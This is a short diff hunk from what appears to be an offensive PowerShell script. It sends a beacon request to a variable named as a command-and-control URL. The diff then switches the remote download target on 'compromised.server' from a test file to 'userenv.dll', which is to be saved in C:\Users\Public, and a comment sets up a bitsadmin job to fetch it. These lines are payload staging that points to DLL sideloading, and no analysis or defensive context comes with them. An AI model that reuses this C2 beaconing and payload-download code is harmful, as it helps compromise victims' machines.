@@ -87,7 +87,7 @@ $parameter = "{0}={1}&{2}={3}&{4}={5}" -f $type, $type_value, $uid, $uid_value, 
 $url = $c2_url + $parameter
 $response = Invoke-WebRequest $url
 
-$remote_url = "http://compromised.server/payloads/test.txt"
+$remote_url = "http://compromised.server/payloads/userenv.dll"
 $local_path = "C:\Users\Public\userenv.dll"
 
 # Create a new bitsadmin job and add a file to the job
